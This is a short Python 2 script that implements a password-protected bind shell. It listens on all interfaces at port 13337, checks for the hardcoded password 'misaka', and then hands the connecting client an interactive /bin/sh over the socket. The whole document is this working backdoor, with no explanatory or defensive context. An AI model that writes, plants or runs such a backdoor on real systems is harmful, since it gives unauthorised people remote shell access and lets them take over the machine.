#! /usr/bin/python
import os,sys
import socket
import time

import subprocess, threading

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 13337))
server.listen(5)
sys.stderr.write('start wait connect')
while True:
    talk, addr = server.accept()
    talk.send('passwd:')
    passwd = talk.recv(1024)
    if passwd.strip() == "misaka":
        def sh(handle):
            print handle
            proc = subprocess.Popen(["/bin/sh", "-i"], stdin=handle, stdout=handle, stderr=handle, shell=True)
            proc.wait()
        threading.Thread(target=sh,args=(talk,)).start()
    else:
        talk.send('bye')